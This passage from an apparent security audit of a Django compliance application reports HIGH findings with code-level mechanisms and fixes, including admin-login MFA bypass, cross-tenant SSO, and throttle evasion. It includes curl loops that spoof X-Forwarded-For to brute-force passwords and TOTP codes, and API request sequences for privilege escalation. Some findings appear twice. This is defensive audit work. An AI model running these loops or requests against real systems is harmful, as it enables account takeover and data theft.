the OIDC/SAML `_LoginThrottle` (accounts/oidc_views.py:20), `_MfaThrottle` for unauthenticated callers (accounts/views.py:206), the public questionnaire throttle, and DRF's global `AnonRateThrottle`.

**Attack.** Unauthenticated. `for i in $(seq 1 1000000); do curl -H "X-Forwarded-For: 10.0.0.$((i%256)).$i" -d '{"username":"admin","password":"..."}' https://host/api/auth/token/; done` — every request lands in a fresh bucket, so the 8/min `login` limit never fires. The same trick removes the limit on the second-factor submission: once the password is known, `{"username":..,"password":..,"otp":"NNNNNN"}` can be sprayed without limit, and `accounts/mfa.py:54-68` accepts a ±1 step window (3 of 10^6 codes valid at any instant), so sustained unmetered guessing recovers a TOTP login in minutes rather than centuries. Backup codes (`accounts/models.py:196-210`) and the public questionnaire token (`vendors/public_views.py`) are equally exposed.

**Guard checked.** I looked for the guard that would stop this: (a) an account lockout — `grep -rn 'lockout|failed_login|login_attempts|AXES'` over backend/ finds only the *admin-panel* lockout guards in accounts/views.py:70-110, nothing that counts failed sign-ins; `audit/events.py:30-63` records failures but never acts on them; (b) a NUM_PROXIES setting — absent; (c) a custom `get_ident` — the codebase deliberately overrides `get_cache_key` in three places (config/urls.py:19-29, :57-62, accounts/views.py:193-207) to avoid the inert-ScopedRateThrottle trap, but leaves `get_ident` as DRF ships it; (d) nginx rate limiting — frontend/nginx.conf has no `limit_req`. Note `audit/middleware.py:31-32` gets this right for the audit trail (it takes the *last* XFF entry), which shows the correct parse exists in the tree but was never applied to throttling. SECURITY.md:117 still advertises "per-client login (8/min) and MFA (10/min) throttles" as the abuse resistance.

**Fix.** Add `"NUM_PROXIES": 1` to the `REST_FRAMEWORK` dict in config/settings.py (make it an env var so a 0-proxy or 2-proxy deployment can set it correctly), which makes DRF take the correct hop out of X-Forwarded-For. Better still, override `get_ident` on the throttle base to reuse `audit.middleware._client_ip`, which already parses XFF correctly, and reject a non-IP ident. Independently, add a per-account failure counter with a backoff on `/api/auth/token/` so the control does not depend on IP identity at all.

---

## [HIGH] The Django admin login bypasses MFA, the login throttle and the 0.9.0 archived-workspace refusal — and the resulting session authenticates the entire /api/ surface

**FIXED in this pass.**

**Dimension:** authn  
**Where:** backend/config/urls.py:85; backend/config/settings.py:370-376; backend/accounts/serializers.py:163-196; backend/accounts/cookie_auth.py:163-164; backend/accounts/tenancy.py:156-158; backend/accounts/admin.py:21-24; frontend/nginx.conf:53-59

**Mechanism.** The second factor is enforced in exactly one place: `MFATokenObtainPairSerializer.validate` (accounts/serializers.py:163-196), which is wired only to `ThrottledTokenObtainPairView` at `/api/auth/token/` (config/urls.py:37, :89). `path("admin/", admin.site.urls)` (config/urls.py:85) mounts stock `django.contrib.admin` with no `AdminSite` subclass and no custom `login_form` — `grep -rn 'AdminSite|admin.site' backend/` returns only `admin.site.register` calls. So `/admin/login/` authenticates on username+password alone, with no TOTP check, no passkey check, and no `LoginRateThrottle` (that throttle is a `throttle_classes` attribute on the DRF view, config/urls.py:36, and never runs for a Django view). The resulting session is not confined to the admin: `config/settings.py:374` puts `rest_framework.authentication.SessionAuthentication` in `DEFAULT_AUTHENTICATION_CLASSES`, so the same cookie authenticates every `/api/` route. It also slips past the 0.9.0 archived-workspace refusal, which lives only in the JWT path — `cookie_auth.py:163-164` refuses in `CookieJWTAuthentication.get_user`, and `tenancy.workspace_id_for` (tenancy.py:156-158) only consults `user._state.fields_cache.get("workspace")`, which is empty because Django's `auth.get_user` loads the user without `select_related("workspace")`, so `cached is None` and the archived check is skipped. `accounts/admin.py:21-24` registers the full stock `UserAdmin` (default fieldsets, so `is_superuser`, `is_staff` and the set-password form are all editable) plus `Workspace` and `Role`.

**Attack.** An organisation enrols MFA on all accounts, including its superuser. An attacker who obtains that superuser's password by any means (phish, reuse, the unthrottled spray in finding 1) tries `POST /api/auth/token/` and is stopped by a 400 `{"mfa_required": true}`. They then `POST /admin/login/` with the same username and password, unlimited retries, no second factor. They are in. From there they either use the admin directly (promote a new superuser, change any user's password, flip a Workspace's `is_active`) or take the `sessionid` cookie plus the `csrftoken` the admin sets and drive the whole REST API as that user — including a superuser's `X-Workspace` switch (tenancy.py:159-167) into every other tenant.

**Guard checked.** I looked for an MFA gate on the admin (an `AdminSite` subclass, a custom `AuthenticationForm`, a middleware asserting `request.user.mfa_enabled` implies a verified factor) — none exists anywhere in backend/. I checked whether `SessionAuthentication` is scoped away from the API — it is not, it is a global default (settings.py:374), and docs/ARCHITECTURE.md:97 / README.md:822 describe it as intentionally retained "for the Django admin" without noting the credential-equivalence. SECURITY.md's production checklist item 7 (line 323) says to put `/admin/` behind an allow-list or VPN, which is a deployment mitigation, not a guard, and SECURITY.md:186 still asserts "MFA is opt-in and safe by construction". nginx proxies `/admin/` unconditionally (frontend/nginx.conf:53-59) with no `limit_req` and no allow/deny.

**Fix.** Subclass `AdminSite` (or override `admin.site.login`) so the admin login runs the same second-factor check as `MFATokenObtainPairSerializer` and the same archived-workspace refusal, and rate-limit it. If the admin is meant to be an operator-only tool, drop `rest_framework.authentication.SessionAuthentication` from `DEFAULT_AUTHENTICATION_CLASSES` (settings.py:374) so an admin session is not an API credential, keeping it only under `if DEBUG` for the browsable API; and gate `path("admin/", ...)` behind an env flag that defaults to off in the shipped stack.

---

## [HIGH] SSO account resolution runs with no active workspace: SSO_WORKSPACE gates only provisioning, so one IdP signs people into every tenant

**Dimension:** sso  
**Where:** backend/accounts/oidc.py:433 (primary); backend/accounts/oidc.py:407, 442, 446-455, 230-234; backend/accounts/tenancy.py:196-198, 265-267; backend/accounts/oidc_views.py:114-117; backend/accounts/saml_views.py:40-45; backend/config/settings.py:598-602; SECURITY.md:8-21

**Mechanism.** `OidcCallbackView` and `SamlAcsView` both set `authentication_classes = []` (oidc_views.py:115, saml_views.py:43), so `request.user` is anonymous for the whole request. `_RequestResolver.resolve()` therefore returns `None` (`if user is None or not user.is_authenticated: return None`, tenancy.py:196-198) and `TenantQuerySet._pin()` short-circuits (`if current_id() is None: return self  # nothing active`, tenancy.py:266-267). Every query `resolve_user()` makes consequently runs across the whole installation. The email-match branch is the one that matters: `matches = list(User.objects.filter(email__iexact=email)[:2])` (oidc.py:433) is unfiltered, and on a single hit it creates a permanent `OidcIdentity` and returns that user (oidc.py:437-444). The workspace containment the module advertises is applied only two branches further down, to auto-provisioning: `with tenancy.scoped(workspace):` around the role lookup and `create_user` (oidc.py:452-465), under the comment "A provisioned account joins the workspace named by SSO_WORKSPACE ... not across the installation". Nothing anywhere compares the resolved user's `workspace_id` to `settings.SSO_WORKSPACE`. SAML reaches the identical code through `cfg.as_oidc()` (saml.py:101-109, 377), with `require_verified_email=False`.

**Attack.** Installation hosts workspaces `alpha` (SSO_WORKSPACE, the org whose IdP is configured) and `beta` (a different client). Defaults: OIDC_LINK_BY_EMAIL=True, OIDC_ALLOWED_DOMAINS=[] (settings.py:594-596, 602). Beta has a Contributor `bob@beta-corp.com`. An Alpha IdP-tenant administrator (or any IdP user who can set a self-asserted address the IdP marks `email_verified: true`) creates/edits an identity with that email, then walks the ordinary flow: GET /api/auth/oidc/start/ -> IdP -> GET /api/auth/oidc/callback/. In `resolve_user` no `OidcIdentity` matches, email is present and verified, the empty domain list allows anything, the unpinned query at oidc.py:433 returns exactly one row -- Beta's bob -- `_privileged(bob)` is False, an `OidcIdentity` is created binding the attacker's IdP subject to bob forever, and a ticket is issued. POST /api/auth/oidc/redeem/ returns a JWT for bob; from then on `workspace_id_for` (tenancy.py:168-169) resolves Beta and the attacker has bob's full access to Beta's controls, evidence, risks and audit packages. No attacker is even required for the accidental variant: an Alpha employee whose email happens to exist only as a Beta account record is silently signed into Beta on her first SSO login. (Where the email exists in both workspaces, `len(matches) > 1` raises `ambiguous_email` -- so collisions fail closed and only the cross-tenant single match succeeds.)

**Guard checked.** I looked for (a) a workspace comparison in `resolve_user` -- there is none; (b) `_privileged()` (oidc.py:230-234), which blocks only `is_superuser or is_staff or can_manage_users`, so every ordinary user of every other workspace is linkable; (c) the domain allow-list (oidc.py:428-430) -- empty by default and installation-wide, so it cannot separate two tenants and is not a tenancy control; (d) `CookieJWTAuthentication.get_user` (cookie_auth.py:146-165), which checks only `is_active` and `workspace.is_active`; (e) `accounts/tests_tenancy.py` -- 28 tests, none touches SSO; `tests_oidc.py`/`tests_saml.py` run inside the single Default workspace the test runner activates (config/testrunner.py:17), so the boundary is never exercised. SECURITY.md:260-266 concedes "a compromised IdP tenant administrator can sign in as any linked non-privileged user", but that is written in the single-organisation framing; SECURITY.md:8-21 separately promises that with several organisations on one installation "every organisation-owned table has a workspace column and the default manager scopes every query", and settings.py:598-600 says only that multi-workspace SSO *mapping* is a later item -- neither carves out cross-workspace sign-in.

**Fix.** In `resolve_user`, resolve the SSO workspace once at the top (the `Workspace.objects.filter(slug=settings.SSO_WORKSPACE, is_active=True)` lookup now at oidc.py:452) and wrap the whole identity/email/provision body in `with tenancy.scoped(workspace):`, so the lookup at oidc.py:433 is pinned; additionally, on the linked-identity branch (oidc.py:409-422) refuse when `identity.user.workspace_id != workspace.pk`, so pre-existing cross-workspace links stop working rather than silently persisting.

---

## [HIGH] A revoked, expired or withdrawn package grant does not stop the external auditor reading evidence bytes: the PBC assignee route survives revocation and the auditor can put themselves on it

**Dimension:** authz  
**Where:** backend/attestations/access.py:118-121 (primary); backend/attestations/pbc_views.py:266-269, 333-343, 319-331, 303-311; backend/attestations/serializers.py:51-56; backend/attestations/pbc_views.py:110

**Mechanism.** `readable_pbc_requests` is the read set for PBC lines and their attachments:
```python
return PbcRequest.objects.filter(
    Q(package__in=readable_packages(user)) | Q(assignee=user)
).distinct()
```
(access.py:118-121). The left arm carries every liveness condition — `revoked_at__isnull=True`, `expires_at__gt=now`, `package__status=SEALED` (access.py:50-57). The right arm, `Q(assignee=user)`, carries **none**: no grant, no expiry, no package status. `PbcItemViewSet.get_queryset` (pbc_views.py:266-269) filters solely on that set, and `PbcItemViewSet.file` (pbc_views.py:333-343) then calls `serve_stored_file(item.document.file, ...)` with no further check — `_touch_grant` (pbc_views.py:313-317) is a no-op when there is no live grant rather than a gate. `assignee` is a plain writable FK to any user (`attestations/models.py:443-446`) and is not in `PbcRequestSerializer.read_only_fields` (serializers.py:51-56), and it is in `PbcRequestViewSet.EDITABLE` (pbc_views.py:110), so the auditor can set it at create time or PATCH it onto a line they raised while it is `open`/`returned`.

**Attack.** 1. Org issues package P (sealed) to auditor account A (`is_auditor`, live `PackageGrant`).
2. A: `POST /api/pbc-requests/ {"package": P, "title": "Termination tickets", "assignee": <A's own user id>}` → 201 (perform_create only checks `package in readable_packages(A)` and `_side()`; it never validates who the assignee is, pbc_views.py:69-100).
3. The organisation answers the line by attaching evidence: `POST /api/pbc-items/ {request, document}` — documents from folders A was never granted (that disclosure is the documented, grant-bounded bypass).
4. The engagement ends. The org revokes (`DELETE /api/package-grants/{id}/` → `revoked_at` set) **or** the grant simply expires **or** the org calls `POST /api/evidence-packages/{P}/withdraw/`.
5. A still gets `GET /api/pbc-requests/` → the line, with its `items` array. `GET /api/pbc-items/{id}/file/` → **200, full evidence bytes**, indefinitely. A can also `DELETE /api/pbc-items/{id}/` (perform_destroy only checks `_may_answer` = assembler-or-assignee, pbc_views.py:303-306) and `POST /api/pbc-requests/{id}/provide/` (pbc_views.py:161-163) — writes by a revoked party.

**Guard checked.** I looked for the guard that would stop this. `attestations/tests_pbc.py:50-58` (`test_nobody_else_can_raise_or_see_a_line`) asserts exactly this property — "A revoked auditor loses the list with the grant" — but the line it raises has **no assignee** (`self.raise_line(self.auditor_client)`, no `assignee=` kwarg), so only the `Q(package__in=...)` arm was ever exercised. `PbcItemViewSet.file` has no `live_grant`, no `package.status`, and no `expires_at` check; `_touch_grant` returns silently when the grant is gone. `PbcRequestViewSet.get_queryset` applies no status filter either. The `get_can` serializer method (serializers.py:80-89) correctly computes `grantee = live_grant(...) is not None`, but it only greys out buttons in the UI — it gates nothing server-side.

**Fix.** Bound the assignee arm the same way the package arm is bounded. In `access.readable_pbc_requests`, replace `Q(assignee=user)` with `Q(assignee=user) & ~Q(package__status=EvidencePackage.Status.WITHDRAWN) & Q(assignee__is_auditor=False)` — or, more directly, exclude auditors from the assignee arm entirely, since the assignee route exists for internal control owners: `Q(assignee=user)` only `if not user.is_auditor`. Separately, refuse an `assignee` who holds the Auditor role in `PbcRequestViewSet.perform_create`/`perform_update`, and add the missing test: raise a line with `assignee=self.auditor.pk`, revoke the grant, assert `/api/pbc-items/{id}/file/` is 404.

---

## [HIGH] The issued auditor can write the organisation-only `management_response` and silently mutate sealed sampling metadata, because `perform_update` saves inside the first branch before the second branch's 403 fires

**Dimension:** authz  
**Where:** backend/attestations/views.py:409-441 (primary); backend/attestations/serializers.py:187-193; backend/attestations/bundle.py:28-59, 476-491; backend/config/settings.py:221-241 (no ATOMIC_REQUESTS)

**Mechanism.** `PackageControlViewSet.perform_update` runs two independent `if` blocks, each with its own `serializer.save()`:
```python
if touching_conclusions:
    grant = access.live_grant(user, row.package)
    if grant is None: raise PermissionDenied(...)
    stamp(row, user, "concluded")
    serializer.save(concluded_by=..., ...)        # views.py:425 — writes ALL of validated_data
if touching_response:
    if not access.can_assemble(user):
        raise PermissionDenied(
            "The management response is written by the assessed organisation.")  # views.py:430
```
DRF's `serializer.save(**kwargs)` merges kwargs over `validated_data` and `ModelSerializer.update` `setattr`s **every** key in it, then `instance.save()`. So the save at views.py:425 persists `management_response`, `note`, `population_size`, `population_source` and `sampling_method` — all writable (`serializers.py:187-193` omits them from `read_only_fields`) — before the check at views.py:429 ever runs. `ATOMIC_REQUESTS` is not set anywhere in `config/settings.py`, so the 403 does not roll the write back. The `touching_conclusions` branch also skips `assert_open`, so this works on a **sealed** package by design.

**Attack.** Auditor A holds a live grant on sealed package P. A sends one request:
`PATCH /api/package-controls/{row}/ {"design_conclusion": "effective", "management_response": "Management accepts the exception and has closed it.", "population_size": 12, "population_source": "HR export", "note": "scope reduced"}`
Response: 403 "The management response is written by the assessed organisation." Database: all five fields are committed. `responded_by`/`responded_at` stay empty, so the forged response is attributed to nobody and looks like the organisation's own text. `bundle.control_payload` (bundle.py:43, 50-56) puts `note` and `population` in the signed manifest, but `manifest.json` in the export is the byte-frozen seal-time copy (bundle.py:476-479) while `controls.csv` is regenerated live from the mutated rows (bundle.py:201-202) — so the ZIP the auditor's own `verify.py` blesses now contains two disagreeing views of the same control, and `verify_pins` only re-hashes document bytes, never the row fields, so `/verify/` still returns `ok: true`.

**Guard checked.** I checked whether the sibling viewset got this right — `PackageSampleViewSet.perform_update` (views.py:539-570) computes every check first and calls `serializer.save(**extra)` exactly once at the end, which is the correct shape and confirms the intent. I checked for `ATOMIC_REQUESTS` (`grep -rn ATOMIC_REQUESTS config/` → nothing) and for a transaction decorator on `perform_update` (none; `transaction.atomic` is used at views.py:169 and :238 but not here). I checked `PackageControlSerializer.validate` (serializers.py:202-213) — it only enforces the "not tested needs a reason" rule and does not partition auditor-writable from org-writable fields.

**Fix.** Compute all authorisation first and save once, as `PackageSampleViewSet` does: validate `touching_conclusions` → `live_grant`, `touching_response` → `can_assemble`, and reject any *other* writable field unless `can_assemble(user)` and `package.is_open`; then a single `serializer.save(**extra)`. Wrapping the method in `transaction.atomic` is a necessary backstop but not the fix — the auditor writing `note`/`population_*` alongside a legitimate conclusion returns 200 today and would still be allowed.

---

## [HIGH] `Folder.owner` is writable by anyone with EDIT, and owner means MANAGE — a self-service edit→manage escalation that unlocks ACL control and cascading evidence deletion

**FIXED in this pass.**

**Dimension:** authz  
**Where:** backend/documents/views.py:60-80 (primary); backend/documents/serializers.py:38-55; backend/documents/models.py:146-148; backend/documents/permissions.py:10-17

**Mechanism.** `FolderSerializer.Meta.read_only_fields = ["is_framework_root", "control"]` (serializers.py:55) — `owner` is left writable. `FolderViewSet.perform_update` (views.py:60-80) guards exactly two things, re-parenting and renaming a seeded folder, then calls `serializer.save()` (views.py:80); it never looks at `owner`. The gate that let the request in is `FolderAccessPermission.has_object_permission` (permissions.py:10-17), which for a non-DELETE unsafe method requires only `obj.can_edit(request.user)`. And `Folder.effective_access` treats ownership as the top of the ladder:
```python
if self.owner_id == user.id:
    best = MANAGE          # models.py:147-148
```
So the write that ownership confers manage is authorised by edit.

**Attack.** User U holds a `FolderPermission(folder=F, user=U, access_level='edit')` on a non-seeded folder F (the ordinary "control owner maintains this evidence folder" grant).
`PATCH /api/folders/{F}/ {"owner": <U's own id>}` → 200. (`parent` absent → `validated_data.get("parent", folder.parent)` equals the current parent, so the re-parent branch is skipped; `name` absent, so the seeded-rename branch is skipped.)
U now holds MANAGE on F and, by inheritance, its whole subtree. With it:
* `POST /api/folder-permissions/ {folder: F, role: <Viewer role>, access_level: "manage"}` — `_check_manage` (views.py:144-146) now passes, so U hands the entire subtree to any user or role.
* `DELETE /api/documents/{id}/` on every document under F — `DocumentAccessPermission` requires `folder.can_manage` for DELETE precisely so that "a control owner cannot make their own audit trail vanish" (permissions.py:26-28). U just made themselves a manager.
* `DELETE /api/folders/{F}/` — `perform_destroy` (views.py:82-89) refuses only seeded folders, so a user-created evidence folder and every document beneath it cascade away.
U can equally set `owner` to a confederate, or strip the legitimate owner of their manage by reassigning it away.

**Guard checked.** I looked for a serializer-level guard on `owner` (`grep -n "owner" documents/serializers.py` — only the read-only `owner_name` display field) and for an ownership check in `perform_update` (there is none; the docstring at views.py:61-64 discusses only re-parenting). The test suite touches this line but from the wrong direction: `documents/tests.py:122-123` asserts that an **admin** PATCHing `{"owner": ...}` on a seeded folder returns 200 ("their owner and description-ish fields are editable") — it establishes that the field is writable and never asks whether an edit-only caller may write it. `test_user_folder_delete_and_move_rules` (tests.py:126-140) covers move and delete but not ownership. The auditor cap at models.py:159 blocks this for `is_auditor` accounts only, because an auditor can never reach EDIT in the first place.

**Fix.** Make `owner` read-only in `FolderSerializer` and set it through an explicit route, or gate it in `perform_update`: if `"owner" in serializer.validated_data and serializer.validated_data["owner"] != folder.owner` then require `folder.can_manage(user)` (matching the rule already applied to re-parenting at views.py:71-72). Add the mirror test to `documents/tests.py`: grant EDIT, PATCH `owner`, assert 403.

---

## [HIGH] `PATCH /api/documents/{id}/` replaces the stored evidence bytes with no folder-edit check, no AV scan, no archived version and no version bump — the document owner needs only VIEW on the folder

**FIXED in this pass.**

**Dimension:** authz  
**Where:** backend/documents/views.py:199-208 (primary); backend/documents/permissions.py:33-39; backend/documents/serializers.py:104, 118-119; contrast backend/documents/views.py:184-197 and 235-264

**Mechanism.** `DocumentSerializer` declares `file = serializers.FileField(write_only=True)` (serializers.py:104) and does not list it in `read_only_fields` (serializers.py:118-119), so `file` is accepted on PATCH. `DocumentViewSet.perform_update` (views.py:199-208) handles only the folder-move case:
```python
new_folder = serializer.validated_data.get("folder")
if new_folder is not None and new_folder.id != serializer.instance.folder_id:
    self._require_folder_edit(new_folder)
doc = serializer.save()
```
It never calls `scan_or_raise`, never calls `_require_folder_edit(doc.folder)`, never archives a `DocumentVersion`, never bumps `doc.version`, and never resets `scan_status`/`quarantined_at`. Both sibling paths do: `perform_create` scans at views.py:190 after the permission check, and `new_version` requires folder edit (views.py:239), re-runs `validate_upload` and `scan_or_raise` (views.py:244-247), archives the old file (views.py:248-252) and bumps the version (views.py:254). The object gate is `DocumentAccessPermission.has_object_permission`, which short-circuits on ownership before ever consulting the folder:
```python
if obj.owner_id == request.user.id:
    return True          # permissions.py:37-38
return folder.can_edit(request.user)
```

**Attack.** Owen owns document D in folder F and holds only `VIEW` on F (the exact fixture in `documents/tests.py:167-170`, where the PATCH returns 200). Owen sends `PATCH /api/documents/{D}/` as multipart with a new `file`. Result: the stored bytes are replaced; `version` still reads 1; `GET /api/documents/{D}/versions/` still returns the old list, so the previous file is gone with no archive row and nothing in the version history says a swap happened; `scan_status` still carries the old file's verdict, so `refuse_if_quarantined` will happily serve the new bytes, and ClamAV never sees them even when `CLAMAV_ENABLED` is on (a control `scanning.py:1-14` deliberately made fail-closed). The same request from any account with VIEW-only access works as long as it owns the row — and `owner` is settable at upload time (views.py:193) and via PATCH. The one thing that does catch it is `verify_pins` on an already-sealed package; a document not yet pinned, or pinned into a still-draft package, is replaced silently.

**Guard checked.** I checked whether `http_method_names` restricts PATCH on `DocumentViewSet` (it does not — views.py:165-170 sets none). I checked `validate_file` (serializers.py:124-125) — it calls `validate_upload`, which is extension/size only (`uploads.py:23-38`) and explicitly does no content inspection. I checked for a scan hook in a signal or in `Document.save` (`grep -rn scan_or_raise` returns only views.py:190, views.py:247, views.py:343/347 and governance/views.py:188/193 — never an update path on documents). `documents/tests_monitor.py` covers quarantine on create and on sweep, not on PATCH.

**Fix.** Either drop `file` from the PATCH surface (add it to `read_only_fields` on `DocumentSerializer` and force byte changes through `new_version`, which already does the right thing), or make `perform_update` do what `new_version` does when `"file" in serializer.validated_data`: `self._require_folder_edit(serializer.instance.folder)`, `scan_or_raise(...)`, archive a `DocumentVersion`, bump `version`, and clear `quarantined_at`/`scan_status`.

---

## [HIGH] The shipped "Auditor" role — described as "sees only granted folders" — is a full-program reader of the whole workspace, including meeting-minute file bytes served with no ACL and no audit row

**Dimension:** authz  
**Where:** backend/accounts/permissions.py:9-14 (primary); backend/compliance/management/commands/seed_frameworks.py:33-34; backend/governance/views.py:44-49 and 196-201; backend/documents/views.py:338 and 350-354; backend/audit/views.py:17-25

**Mechanism.** `_CapabilityPermission` is the base of `CanManageUsers`, `CanManageFrameworks`, `CanManageDocuments` and `CanManageFolders`:
```python
if request.method in SAFE_METHODS:
    return True                                   # permissions.py:12-13
return getattr(request.user, self.capability, False)
```
The capability gates writes only; **every** authenticated account reads. The seeded Auditor role is `dict(is_auditor=True)` with the description "Read-only external auditor; sees only granted folders" (seed_frameworks.py:33-34), and `is_auditor` is consulted in exactly five production places (`grep -rn is_auditor`): the folder cap at `documents/models.py:159`, the grant gate at `attestations/access.py:76`, the recipient check at `attestations/views.py:707`, and two places that *widen* the auditor — `audit/views.py:24` and `governance/views.py:42`. Nothing narrows it. `ManageDocumentsOrReadOnly` (governance/views.py:44-49) returns `True` for any authenticated GET, and `MeetingMinuteViewSet.download` (governance/views.py:196-201) is an `@action` that inherits it and calls `serve_stored_file(minute.file, ...)` with no folder model, no ACL and no `record_evidence_read` — `MeetingMinute` is not a `Folder` child, so folder RBAC simply does not exist for it. `FormTemplateViewSet.download` (documents/views.py:350-354, under `permission_classes = [CanManageDocuments]` at :338) is the same shape.

**Attack.** An external audit firm's account A is created with the Auditor role and issued one package for one engagement — the narrow, expiring disclosure the whole `attestations/access.py` module exists to bound. With nothing but that login, A can also GET: `/api/users/` → every account with `email`, `job_title`, `role` and the full `capabilities` map (`accounts/serializers.py:36-42`); `/api/risks/` and `/api/risks/export/` → the entire risk register including un-disclosed `AUDIT_FINDING` rows from other engagements; `/api/vendors/` and `/api/vendors/export/`; `/api/controls/export/`; `/api/access-reviews/{id}/export/` (explicitly allowed by `AccessAuditPermission`, governance/views.py:40-42); `/api/audit-log/` → every login and every evidence read in the workspace (audit/views.py:24); and `/api/meeting-minutes/` then `/api/meeting-minutes/{id}/download/` → the raw file bytes of every board and security-committee minute the organisation has uploaded, with no ACL check and nothing written to the audit trail, so the organisation cannot even see afterwards that it happened.

**Guard checked.** I looked for a role-scoped denial for auditors outside the package module and found none — the five `is_auditor` call sites are listed above and none of them restricts. I checked whether `MeetingMinute` carries a folder or an owner-scoped queryset (`governance/models.py:118-126`, `governance/views.py:180-194`: `queryset = MeetingMinute.objects.select_related("series", "created_by")`, unfiltered). I checked `readable_packages`' own docstring (access.py:37-42), which is careful to deny `can_manage_documents` a cross-folder read — that care is real, and it is undone one app over. Tenancy pins these querysets to the workspace, so this is intra-tenant only.

**Fix.** Two separable changes. (1) Stop `_CapabilityPermission` from granting blanket reads to external roles: give it an `allow_auditor_read = False` class attribute and return `False` for `request.user.is_auditor` on SAFE_METHODS unless a subclass opts in — or add a global `IsNotExternalAuditor` to `DEFAULT_PERMISSION_CLASSES` and exempt the attestations app explicitly. (2) Give `MeetingMinuteViewSet.download` and `FormTemplateViewSet.download` a real gate and an audit row, so file bytes never leave the product on a permission class whose only rule is "is authenticated".

---

## [HIGH] Every rate limit in the product is keyed on an attacker-supplied X-Forwarded-For header, and there is no account lockout — unbounded password and TOTP guessing

**FIXED in this pass.**

**Dimension:** public-surface  
**Where:** backend/config/urls.py:29 and :62; backend/vendors/public_views.py:21-22; backend/accounts/oidc_views.py:19-20; backend/config/settings.py:387-400 (no `NUM_PROXIES` key anywhere in the tree); frontend/nginx.conf:49; contrast with backend/audit/middleware.py:23-37

**Mechanism.** Every throttle in the product builds its cache key from `self.get_ident(request)`: `LoginRateThrottle.get_cache_key` (config/urls.py:29), `RefreshRateThrottle.get_cache_key` (config/urls.py:62), `_QuestionnaireThrottle.get_cache_key` (vendors/public_views.py:21-22), `_LoginThrottle.get_cache_key` (accounts/oidc_views.py:19-20), plus DRF's own `AnonRateThrottle` and the `mfa` scope. DRF's `BaseThrottle.get_ident` (.venv/Lib/site-packages/rest_framework/throttling.py:24-39) ends with `return ''.join(xff.split()) if xff else remote_addr` whenever `api_settings.NUM_PROXIES` is `None` — and `NUM_PROXIES` is never set: `grep -rn "NUM_PROXIES" backend/` returns nothing, and DRF's default is `None` (.venv/…/rest_framework/settings.py:64). So the *whole* `X-Forwarded-For` string, attacker-chosen prefix included, becomes the throttle bucket. nginx does not sanitise it: `frontend/nginx.conf:49` is `proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`, which *appends* `$remote_addr` to whatever the client sent, and there is no `set_real_ip_from` / `real_ip_header` anywhere in the file. I confirmed the behaviour by instantiating the real classes against a Django `RequestFactory` with `REMOTE_ADDR=10.0.0.5`: `X-Forwarded-For: 1.2.3.4` → key `throttle_login_1.2.3.4`, `9.9.9.9` → `throttle_login_9.9.9.9`, `AAAA` → `throttle_login_AAAA`. The codebase gets this right one file over — `audit/middleware.py:31-32` deliberately takes `xff.split(",")[-1]` because "the rightmost hop is the least spoofable choice" — so the reasoning exists but was never applied to the throttles. There is no compensating per-account lockout: `INSTALLED_APPS` (config/settings.py:161-185) has no django-axes, `accounts/models.py` has no failed-attempt counter or `locked_until`, and `MFATokenObtainPairSerializer.validate` (accounts/serializers.py:178-183) counts nothing when `device.verify(otp)` fails.

**Attack.** Send `POST /api/auth/token/` with a fresh random `X-Forwarded-For` header on every request: `for i in $(seq 1 1000000); do curl -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" -d '{"username":"mia","password":"…"}' https://target/api/auth/token/; done`. Each request lands in its own Redis bucket, so the 8/min `login` limit never fires and password guessing is bounded only by bandwidth. The same header defeats the `mfa` 10/min scope, which is the only thing standing between an attacker who has a valid password and the 10^6 TOTP space (`accounts/serializers.py:180-183` — TOTP or a backup code, unlimited attempts). It also defeats the `refresh` (30/min), `anon` (30/min) and `questionnaire` (20/min) budgets — the last one letting an unauthenticated caller hammer `PUT /api/questionnaire/{token}/`, which with no `DEFAULT_PARSER_CLASSES` override accepts 32 MB multipart bodies (nginx.conf:24) that DRF spools to disk before `validate_answers` rejects them.

**Guard checked.** I looked for `NUM_PROXIES` in settings (absent), for an nginx `real_ip_module` block that would rewrite the header before it reaches Django (nginx.conf has only the four `proxy_set_header` lines at :47-50 and :55-58, no `set_real_ip_from`), for `limit_req` in nginx (absent), for an account-lockout app in INSTALLED_APPS (absent), and for a per-user failed-attempt counter on the `User` model (absent — `grep -n "lock|failed_login" accounts/models.py` returns only an unrelated docstring line). `audit/events.record_login_attempt` (config/urls.py:47) writes the failure to the audit trail but takes no action on it.

**Fix.** Add `"NUM_PROXIES": env_int("TRUSTED_PROXY_HOPS", 1)` to the `REST_FRAMEWORK` dict at config/settings.py:387-400 — with the shipped one-hop nginx that makes `get_ident` return `addrs[-1]`, the same rightmost-hop rule `audit/middleware.py:31-32` already uses. Better still, give the four throttle classes a shared `get_ident` that delegates to `audit.middleware._client_ip` so the two code paths cannot drift again. Independently, add a per-account failed-attempt lockout so the throttle is not the only brute-force barrier.

---

## [HIGH] PATCH /api/documents/{id}/ swaps the stored evidence file with no malware scan, no version snapshot, and leaves the stale "clean" verdict in place

**FIXED in this pass.**

**Dimension:** files-in  
**Where:** backend/documents/views.py:199-208 (perform_update); contrast backend/documents/views.py:190; backend/documents/serializers.py:104, 118-119; backend/documents/views.py:235-264

**Mechanism.** `DocumentSerializer` declares `file = serializers.FileField(write_only=True)` (serializers.py:104) and `read_only_fields` (serializers.py:118-119) lists only `version, created_by, next_review_date, scan_status, scan_signature, scanned_at` — `file` is writable on update. `DocumentViewSet.perform_update` is:

```python
def perform_update(self, serializer):
    new_folder = serializer.validated_data.get("folder")
    if new_folder is not None and new_folder.id != serializer.instance.folder_id:
        self._require_folder_edit(new_folder)
    doc = serializer.save()
    doc.compute_next_review()
```

There is no `scan_or_raise`. `grep -rn scan_or_raise` returns documents/views.py:190 (create), 247 (new_version), 343 and 347 (FormTemplate create/update) and governance/views.py:188, 193 (MeetingMinute create/update) — every byte-accepting write path in the product **except** this one. `validate_upload` still runs (serializers.py:124-125), so the size/extension checks apply; only the ClamAV boundary is skipped. It also bypasses the entire provenance machinery that the documented route (`new_version`, views.py:248-262) performs: no `DocumentVersion` row is written, `doc.version` is not bumped, `quarantined_at`/`scan_status`/`scanned_at` are not touched, and `monitor.mark_clean` is not called. The row therefore keeps reporting `scan_status: "clean"` with a `scanned_at` that predates the bytes now on disk, and `version: N` for content that is not version N. The sweep does not close the window either: `scan_evidence` defaults to `--stale 30` on `scanned_at` (documents/management/commands/scan_evidence.py:24-25, 42-43) and INSTALL.md:217 schedules it monthly (`15 3 1 * *`), so a file whose `scanned_at` was refreshed by the original upload is skipped for up to two months.

